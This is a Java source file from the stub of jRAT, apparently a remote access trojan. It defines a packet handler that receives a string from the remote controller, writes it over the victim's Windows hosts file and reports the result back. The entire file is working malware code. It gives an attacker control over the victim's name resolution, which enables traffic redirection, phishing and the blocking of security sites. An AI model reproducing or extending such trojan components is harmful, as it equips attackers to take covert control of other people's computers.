package su.jrat.stub.packets.incoming;

import java.io.FileWriter;

import su.jrat.common.OperatingSystem;
import su.jrat.stub.Connection;
import su.jrat.stub.packets.outgoing.Packet39HostEditResult;


public class Packet56UpdateHostsFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String str = Connection.readLine();
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			try {
				FileWriter writer = new FileWriter(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
				writer.write(str);
				writer.close();
				Connection.addToSendQueue(new Packet39HostEditResult(""));
			} catch (Exception ex) {
				Connection.addToSendQueue(new Packet39HostEditResult("ERR: " + ex.getMessage()));
			}
		} else {
			Connection.addToSendQueue(new Packet39HostEditResult("ERR: Windows only"));
		}
	}

}
